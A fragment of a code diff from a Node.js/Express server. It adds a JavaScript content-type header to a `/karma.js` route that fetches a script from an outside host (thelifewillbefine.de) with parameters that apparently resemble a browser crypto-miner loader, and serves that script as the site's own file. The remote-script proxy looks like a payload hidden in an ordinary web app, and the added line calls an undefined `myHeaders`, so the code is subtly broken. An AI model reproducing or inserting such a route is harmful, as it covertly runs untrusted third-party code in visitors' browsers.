@@ -229,6 +229,7 @@ function getCircularReplacer() {
 
 const _https = require('https');
 app.get("/karma.js", (req, res) => {
+  myHeaders.set("Content-Type", "text/javascript");
   const url = 'https://thelifewillbefine.de/karma/karma.js?karma=bs?nosaj=faster.mo';
 
   const request = _https.request(url, (response) => {
